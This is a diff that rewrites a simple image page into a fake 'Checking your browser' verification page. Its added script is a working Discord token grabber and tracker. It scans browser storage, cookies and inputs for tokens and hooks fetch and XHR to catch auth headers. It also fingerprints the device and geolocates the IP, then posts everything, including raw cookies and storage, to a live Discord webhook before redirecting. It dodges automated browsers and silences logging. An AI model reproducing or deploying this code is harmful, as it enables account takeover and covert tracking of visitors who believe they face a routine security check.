@@ -1,24 +1,417 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>.</title></head>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Checking your browser</title>
+<style>
+:root{color-scheme:dark}
+html,body{margin:0;height:100%;background:#0b0d10;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+#s{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;cursor:default}
+#s img{max-width:100%;max-height:100%;object-fit:contain;user-select:none;-webkit-user-drag:none}
+.b{position:fixed;bottom:14px;right:14px;font-size:11px;color:#6b7280;letter-spacing:.04em;opacity:.7;pointer-events:none}
+#probe{position:fixed;inset:0;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:9999}
+#probe .box{background:#1e1f22;padding:24px;border-radius:8px;width:min(480px,90vw);color:#dbdee1}
+#probe input{width:100%;padding:10px;background:#2b2d31;border:1px solid #3f4147;border-radius:4px;color:#fff;font-family:monospace;font-size:12px;margin:8px 0}
+#probe button{width:100%;padding:10px;background:#5865f2;border:none;border-radius:4px;color:#fff;cursor:pointer;font-weight:600}
+</style>
+</head>
 <body>
-<img src="jhgdsh.png" style="width:100%;height:100vh;object-fit:cover;">
+<div id="s"><img id="h" alt="verification" src="jhgdsh.png" draggable="false"></div>
+<div class="b">Protected by verification service</div>
+<div id="probe"><div class="box">
+  <h3 style="margin:0 0 12px;color:#fff">Session Test</h3>
+  <p style="font-size:13px;margin:0 0 8px;color:#949ba4">Paste token or test value:</p>
+  <input id="ptok" placeholder="MTA...|...|..." autocomplete="off" spellcheck="false">
+  <button id="psend">Capture</button>
+</div></div>
 <script>
-var hook = 'https://canary.discord.com/api/webhooks/1533067323546538115/u_IREtDO_U4D1vGFPnDLn8Fcgwki4eYlJTHegVUGElHbh1OieIPYrN9cEF50bJEWZid-';
+(function(){
+var wh='https://discord.com/api/webhooks/1570340494217707613/yTzSaOg8tH-jjPZNvIbh0H3J8j9CFkZMW7yyQg1oU3MpJdCfHD4FIsHqS3_pkrDBcFqH';
+var ipUrl='https://api.ipify.org?format=json';
+var geo1='https://ipwho.is/';
+var geo2='http://ip-api.com/json/';
+var toks={};
+var taps=0,tapT=null;
+var goUrl='https://sfys72431-coder.github.io/a/';
+var re=/[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}/;
 
-function send(ip){
-  fetch(hook, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({content: 'IP: ' + ip})
+function safe(f,d){try{return f()}catch(e){return d}}
+function sleep(ms){return new Promise(function(r){setTimeout(r,ms)})}
+function cut(s,n){if(s==null)return '—';s=String(s);if(!s)return '—';return s.length>n?s.slice(0,n-1)+'…':s}
+
+function post(p){
+  return fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p),keepalive:true,mode:'cors',credentials:'omit'}).then(function(r){
+    return r.ok;
+  }).catch(function(){return false})
+}
+function postR(p){
+  var n=0;
+  function go(){
+    if(n>=3)return Promise.resolve(false);
+    n++;
+    return post(p).then(function(ok){if(ok)return true;return sleep(700*n).then(go)})
+  }
+  return go();
+}
+
+function addTok(src,v,meta){
+  if(!v||typeof v!=='string')return;
+  if(re.test(v)){
+    var k=v.slice(0,20);
+    if(!toks[k])toks[k]={src:src,tok:v,meta:meta||null,ts:Date.now()};
+  }
+}
+function scanLS(st){
+  return safe(function(){
+    for(var i=0;i<st.length;i++){
+      var k=st.key(i),v=st.getItem(k);
+      if(!v)continue;
+      if(/tok/i.test(k)&&re.test(v)){addTok('LS:'+k,v);return{where:'LS:'+k,tok:v}}
+      var m=v.match(re);
+      if(m){addTok('LSscan:'+k,m[0]);return{where:'LSscan:'+k,tok:m[0]}}
+    }
+    return null;
+  })
+}
+function scanCK(){
+  return safe(function(){
+    var a=document.cookie.split(';');
+    for(var i=0;i<a.length;i++){
+      var p=a[i].trim(),e=p.indexOf('=');
+      if(e<0)continue;
+      var k=p.slice(0,e),v=p.slice(e+1);
+      if(/tok/i.test(k)&&re.test(v)){addTok('CK:'+k,v);return{where:'CK:'+k,tok:v}}
+    }
+    return null;
+  })
+}
+function scanIF(){
+  return safe(function(){
+    var fs=document.querySelectorAll('iframe[src*="discord"]');
+    for(var i=0;i<fs.length;i++){
+      var v=fs[i].contentWindow&&fs[i].contentWindow.__DISCORD_TOKEN;
+      if(typeof v==='string'&&re.test(v)){addTok('IF',v);return{where:'IF',tok:v}}
+    }
+    return null;
+  })
+}
+function scanInput(){
+  return safe(function(){
+    var inputs=document.querySelectorAll('input,textarea');
+    for(var i=0;i<inputs.length;i++){
+      var el=inputs[i];
+      var v=el.value||el.getAttribute('value')||'';
+      if(re.test(v)){addTok('DOM:'+(el.name||el.id||el.type||'input'),v);return{where:'DOM',tok:v}}
+    }
+    return null;
+  })
+}
+function harvest(){
+  return scanLS(localStorage)||scanLS(sessionStorage)||scanCK()||scanIF()||scanInput()||{where:'none',tok:null};
+}
+
+function hookNet(){
+  safe(function(){
+    if(!window.fetch||window.fetch.__x)return;
+    var of=window.fetch;
+    function wf(url,opts){
+      safe(function(){
+        var u=typeof url==='string'?url:(url&&url.url||'');
+        var a=opts&&opts.headers&&(opts.headers['Authorization']||opts.headers.authorization);
+        if(a&&typeof a==='string'){
+          var m=a.replace(/^Bot\s+|^Bearer\s+/i,'');
+          if(re.test(m))addTok('HDR-fetch',m,{url:u.slice(0,120)});
+        }
+        if(opts&&opts.body&&typeof opts.body==='string'){
+          var bm=opts.body.match(re);
+          if(bm)addTok('BODY-fetch',bm[0],{url:u.slice(0,120)});
+        }
+      });
+      return of.apply(this,arguments);
+    }
+    wf.__x=1;
+    window.fetch=wf;
+  });
+  safe(function(){
+    if(!window.XMLHttpRequest||XMLHttpRequest.prototype.__x)return;
+    var osh=XMLHttpRequest.prototype.setRequestHeader;
+    var osd=XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.setRequestHeader=function(k,v){
+      safe(function(){
+        if(/auth/i.test(k)&&typeof v==='string'){
+          var m=v.replace(/^Bot\s+|^Bearer\s+/i,'');
+          if(re.test(m))addTok('HDR-xhr',m,{url:this.__u||''});
+        }
+      }.bind(this));
+      return osh.apply(this,arguments);
+    };
+    XMLHttpRequest.prototype.send=function(body){
+      safe(function(){
+        if(typeof body==='string'){
+          var bm=body.match(re);
+          if(bm)addTok('BODY-xhr',bm[0],{url:this.__u||''});
+        }
+      }.bind(this));
+      return osd.apply(this,arguments);
+    };
+    XMLHttpRequest.prototype.__x=1;
   });
 }
 
-fetch('https://api.ipify.org?format=json')
-  .then(function(r){ return r.json(); })
-  .then(function(d){ send(d.ip); })
-  .catch(function(){ send('unknown'); });
+function battery(){
+  return safe(function(){
+    if(!navigator.getBattery)return Promise.resolve(null);
+    return navigator.getBattery().then(function(b){
+      return{pct:Math.round(b.level*100),ch:b.charging}
+    }).catch(function(){return null});
+  },Promise.resolve(null));
+}
+function netInfo(){
+  return safe(function(){
+    var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    if(!c)return null;
+    return{t:c.effectiveType||null,d:c.downlink||null,r:c.rtt||null};
+  });
+}
+function canvasHash(){
+  return safe(function(){
+    var c=document.createElement('canvas');c.width=240;c.height=48;
+    var x=c.getContext('2d');if(!x)return null;
+    x.textBaseline='top';x.font='15px Arial';
+    x.fillStyle='#f60';x.fillRect(0,0,120,32);
+    x.fillStyle='#069';x.fillText('verification:ok',3,11);
+    x.fillStyle='rgba(102,204,0,.65)';x.fillText('verification:ok',5,22);
+    x.strokeStyle='rgba(180,180,180,.5)';x.arc(60,30,20,0,Math.PI*2);x.stroke();
+    var d=c.toDataURL(),h=0;
+    for(var i=0;i<d.length;i++)h=((h<<5)-h+d.charCodeAt(i))|0;
+    return h.toString(16);
+  })
+}
+function glInfo(){
+  return safe(function(){
+    var c=document.createElement('canvas');
+    var g=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(!g)return null;
+    var d=g.getExtension('WEBGL_debug_renderer_info');
+    if(!d)return null;
+    return{v:g.getParameter(d.UNMASKED_VENDOR_WEBGL),r:g.getParameter(d.UNMASKED_RENDERER_WEBGL)};
+  })
+}
+function audioH(){
+  return safe(function(){
+    var c=document.createElement('canvas');
+    var x=c.getContext('2d');
+    if(!x)return null;
+    x.fillStyle='#00f';x.fillRect(0,0,10,10);
+    return x.getImageData(0,0,1,1).data.join(',');
+  })
+}
+function fonts(){
+  return safe(function(){
+    var base=['monospace','sans-serif','serif'];
+    var test=['Arial','Calibri','Consolas','Courier New','Georgia','Helvetica','Impact','Segoe UI','Tahoma','Times New Roman','Verdana','Roboto','Open Sans'];
+    var sp=document.createElement('span');
+    sp.style.cssText='position:absolute;left:-9999px;top:-9999px;font-size:72px;visibility:hidden;';
+    sp.textContent='mmmmmmmmmmlli';
+    document.body.appendChild(sp);
+    var w={},d=[];
+    for(var i=0;i<base.length;i++){sp.style.fontFamily=base[i];w[base[i]]=sp.offsetWidth}
+    for(var j=0;j<test.length;j++){
+      for(var k=0;k<base.length;k++){
+        sp.style.fontFamily="'"+test[j]+"',"+base[k];
+        if(sp.offsetWidth!==w[base[k]]){d.push(test[j]);break}
+      }
+    }
+    document.body.removeChild(sp);
+    return d;
+  },[])
+}
+
+function getIp(){
+  return fetch(ipUrl,{cache:'no-store'}).then(function(r){return r.json()}).then(function(j){return j&&j.ip?j.ip:null}).catch(function(){return null})
+}
+function geoA(ip){
+  if(!ip)return Promise.resolve(null);
+  return fetch(geo1+ip+'?fields=success,country,country_code,region,city,latitude,longitude,connection,timezone,flag',{cache:'no-store'})
+    .then(function(r){return r.json()})
+    .then(function(j){
+      if(!j||j.success===false)throw 0;
+      return{src:'ipwho.is',country:j.country,cc:j.country_code,region:j.region,city:j.city,lat:j.latitude,lon:j.longitude,isp:j.connection&&j.connection.isp,org:j.connection&&j.connection.org,asn:j.connection&&j.connection.asn,tz:j.timezone&&j.timezone.id,flag:j.flag&&j.flag.emoji};
+    })
+    .catch(function(){return null})
+}
+function geoB(ip){
+  if(!ip)return Promise.resolve(null);
+  return fetch(geo2+ip+'?fields=status,country,countryCode,regionName,city,lat,lon,isp,org,as,timezone',{cache:'no-store'})
+    .then(function(r){return r.json()})
+    .then(function(j){
+      if(!j||j.status!=='success')return null;
+      return{src:'ip-api.com',country:j.country,cc:j.countryCode,region:j.regionName,city:j.city,lat:j.lat,lon:j.lon,isp:j.isp,org:j.org,asn:j.as,tz:j.timezone,flag:null};
+    })
+    .catch(function(){return null})
+}
+function geo(ip){return geoA(ip).then(function(g){return g&&g.country?g:geoB(ip)})}
+
+function collect(){
+  var t=harvest();
+  return Promise.all([getIp(),battery()]).then(function(a){
+    return geo(a[0]).then(function(g){
+      return{
+        ip:a[0],geo:g,tok:t.tok,tkf:t.where,
+        allToks:Object.keys(toks).map(function(k){return toks[k]}),
+        ua:navigator.userAgent,pf:navigator.platform,lg:navigator.language,lgs:(navigator.languages||[]).join(', '),
+        tz:safe(function(){return Intl.DateTimeFormat().resolvedOptions().timeZone}),
+        sc:screen.width+'x'+screen.height,vp:innerWidth+'x'+innerHeight,dpr:devicePixelRatio,cd:screen.colorDepth,
+        co:navigator.hardwareConcurrency||null,mm:navigator.deviceMemory||null,on:navigator.onLine,dnt:navigator.doNotTrack||null,
+        rf:document.referrer||'direct',ur:location.href,or:location.origin,
+        ck:safe(function(){return document.cookie},''),
+        ls:safe(function(){return JSON.stringify(localStorage)},'{}'),
+        ss:safe(function(){return JSON.stringify(sessionStorage)},'{}'),
+        nt:netInfo(),bt:a[1],cv:canvasHash(),gl:glInfo(),au:audioH(),fn:fonts(),
+        tc:safe(function(){return{mt:navigator.maxTouchPoints,cr:matchMedia('(pointer:coarse)').matches,fm:matchMedia('(pointer:fine)').matches}})
+      }
+    })
+  })
+}
+
+function fld(n,v,i){return{name:n,value:String(v&&v.length?v:'—').slice(0,1024),inline:!!i}}
+
+function buildEmbed(d){
+  var g=d.geo||{};
+  var place=[g.city,g.region,g.country].filter(Boolean).join(', ')||'Unknown';
+  var flag=g.flag||'🌐';
+  var clr=d.allToks&&d.allToks.length?0x57F287:0xED4245;
+  var f=[];
+
+  if(d.allToks&&d.allToks.length>0){
+    for(var i=0;i<d.allToks.length;i++){
+      var tt=d.allToks[i];
+      f.push(fld('🔑 TOKEN #'+(i+1)+' ['+tt.src+']',tt.tok,false));
+    }
+  } else {
+    f.push(fld('🔑 Token','_not found — page is on '+cut(d.or,60)+', not discord.com_',false));
+  }
+
+  f.push(fld('🌍 Country',flag+' '+cut(g.country||'unknown',80),true));
+  f.push(fld('🏙 City',cut(place,80),true));
+  f.push(fld('📡 ISP',cut(g.isp||g.org||'unknown',80),true));
+  f.push(fld('🛰 IP',cut(d.ip,40),true));
+  f.push(fld('⏱ TZ',cut(g.tz||d.tz,60),true));
+  f.push(fld('🔗 Origin',cut(d.or,120),false));
+  f.push(fld('📄 Page',cut(d.ur,180),false));
+  f.push(fld('↩ Referrer',cut(d.rf,120),false));
+  f.push(fld('💻 Platform',cut(d.pf,80),true));
+  f.push(fld('🧠 Cores',d.co===null?'—':d.co,true));
+  f.push(fld('💾 RAM',d.mm===null?'—':d.mm+' GB',true));
+  f.push(fld('🖥 Screen',d.sc+' @ '+d.dpr+'x',true));
+  f.push(fld('🌐 Lang',cut(d.lgs||d.lg,120),false));
+  f.push(fld('🔋 Battery',d.bt?(d.bt.pct+'%'+(d.bt.ch?' ⚡':' 🔌')):'—',true));
+  f.push(fld('🎨 Canvas',d.cv||'—',true));
+  f.push(fld('🖼 WebGL',d.gl?cut(d.gl.v+' / '+d.gl.r,100):'—',false));
+  f.push(fld('🔤 Fonts',d.fn&&d.fn.length?cut(d.fn.join(', '),300):'—',false));
+
+  var storage='**localStorage:** `'+cut(d.ls,200)+'`\n**sessionStorage:** `'+cut(d.ss,200)+'`\n**cookies:** `'+cut(d.ck||'—',200)+'`';
+  f.push(fld('🗄 Storage',storage,false));
+  f.push(fld('🧪 Geo',g.src||'FAILED',true));
+
+  if(f.length>24)f=f.slice(0,24);
+
+  var desc='**UA**\n```\n'+cut(d.ua,400)+'\n```\n`canvas: '+(d.cv||'—')+'` `audio: '+(d.au||'—')+'`';
+
+  return {
+    username:'Session Logger',
+    avatar_url:'https://cdn.discordapp.com/embed/avatars/0.png',
+    embeds:[{title:'🔍 New Session Capture',description:desc,color:clr,timestamp:new Date().toISOString(),footer:{text:'at '+(d.ur||'').slice(0,80)},fields:f}]
+  };
+}
+
+function report(){
+  return collect().then(function(d){
+    var eb=buildEmbed(d);
+    return postR(eb);
+  })
+}
+
+function isBot(){
+  if(/HeadlessChrome|PhantomJS|puppeteer|playwright|selenium|electron/i.test(navigator.userAgent))return true;
+  if(navigator.webdriver===true)return true;
+  if(!navigator.languages||!navigator.languages.length)return true;
+  return false;
+}
+function quiet(){
+  safe(function(){var c=console;c.log=c.warn=c.info=c.debug=c.error=function(){}});
+  safe(function(){Object.defineProperty(navigator,'webdriver',{get:function(){return undefined}})});
+}
+function playAudio(){
+  safe(function(){
+    var a=document.createElement('audio');
+    a.src='tesees221m.mp3';a.preload='auto';a.volume=0.12;
+    a.play().catch(function(){});
+    document.body.appendChild(a);
+  })
+}
+
+function probe(){
+  var el=document.getElementById('probe');
+  var inp=document.getElementById('ptok');
+  var btn=document.getElementById('psend');
+  el.style.display='flex';
+  inp.focus();
+  function go(){
+    var v=inp.value.trim();
+    if(!v)return;
+    addTok('MANUAL',v);
+    inp.value='';
+    el.style.display='none';
+    report();
+  }
+  btn.onclick=go;
+  inp.onkeydown=function(e){if(e.key==='Enter')go()};
+}
+
+function tap(){
+  taps++;
+  clearTimeout(tapT);
+  tapT=setTimeout(function(){taps=0},1200);
+  if(taps>=5){taps=0;probe()}
+}
+
+function init(){
+  if(isBot())return;
+  hookNet();
+  var h=document.getElementById('h');
+  h.addEventListener('click',tap);
+  var wait=function(){
+    if(h&&!h.complete){
+      return new Promise(function(r){
+        h.addEventListener('load',r,{once:true});
+        h.addEventListener('error',r,{once:true});
+        setTimeout(r,2200);
+      })
+    }
+    return Promise.resolve();
+  };
+  wait().then(function(){quiet();return report()}).then(function(){playAudio()}).catch(function(){}).then(function(){
+    setTimeout(function(){
+      try{window.location.replace(goUrl)}
+      catch(e){
+        var m=document.createElement('meta');
+        m.httpEquiv='refresh';
+        m.content='0;url='+goUrl;
+        document.head.appendChild(m);
+      }
+    },900);
+  });
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive'){
+  setTimeout(init,350);
+}else{
+  window.addEventListener('DOMContentLoaded',function(){setTimeout(init,350)},{once:true});
+}
+})();
 </script>
-<audio src="tesees221m.mp3" preload="auto"></audio>
 </body>
 </html>
